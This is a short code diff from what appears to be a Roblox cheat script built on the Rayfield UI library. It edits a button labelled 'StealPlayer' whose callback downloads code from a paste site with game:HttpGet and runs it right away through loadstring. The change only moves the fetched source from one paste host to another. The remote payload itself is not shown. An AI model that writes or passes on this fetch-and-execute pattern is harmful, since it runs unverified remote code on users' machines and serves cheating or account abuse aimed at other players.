@@ -25,7 +25,7 @@ MainTab:CreateButton({
     Name = "StealPlayer",
     Callback = function()
         local success, err = pcall(function()
-            loadstring(game:HttpGet("http://vpaste.net/eyzNu"))()
+            loadstring(game:HttpGet("https://paste.ee/r/zMlHrdXW"))()
         end)
         if success then
             Rayfield:Notify({
